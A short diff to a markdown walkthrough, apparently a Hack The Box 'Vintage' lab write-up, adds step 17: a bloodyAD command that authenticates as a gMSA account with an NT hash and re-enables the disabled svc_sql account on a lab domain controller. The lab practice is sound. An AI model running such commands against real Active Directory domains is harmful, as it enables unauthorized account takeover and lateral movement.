@@ -120,7 +120,7 @@
 
 17. Enable the svc_sql account using bloodyAD
 
-``
+`bloodyAD -k --dc-ip 10.129.231.205 --host dc01.vintage.htb -f rc4 -u 'GMSA01$' -p [NT_HASH] -d vintage.htb remove uac svc_sql -f ACCOUNTDISABLE`
 
 <img width="914" height="63" alt="image" src="https://github.com/user-attachments/assets/9c1363f6-642a-4f4b-913c-b6a7f7dec63a" />
 
